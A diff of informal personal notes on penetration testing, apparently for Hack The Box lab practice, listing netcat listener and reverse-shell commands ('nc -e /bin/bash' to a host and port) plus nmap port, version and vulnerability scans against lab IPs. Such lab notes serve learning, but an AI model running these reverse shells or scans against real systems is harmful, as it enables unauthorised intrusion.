@@ -5,12 +5,20 @@ nc -nvlp port for listening ports wich is we wanna use that
 next type id next ls or pwd
 nc -e /bin/bash host ip and port when we enter system 
 nmap:
-nmap -sS -A -v -p --min-rate 99999 host 
+nmap -sS -A -v -p --min-rate 10000 host 
 nmap -p- -sV port scanning ant its version
 nmap -sV -sC -v From your scans, what version is FTP running on the target?
 nmap -sS -p- -Pn --min-rate host ip for            to find all open ports
 nmap -sC -sV -p htb
  nmap --script vuln -A 10.129.123.49 for finding all vulnerablitie
+
+for finding specific ports 
+1) nmap -p- --min-rate 10000 -oA nmap/allports -v 10.129.95.166
+2)nmap -sC -sV   -p 22,80 10.129.95.166 
+
+
+
+
 
 
 when the site open u must use /robots.txt
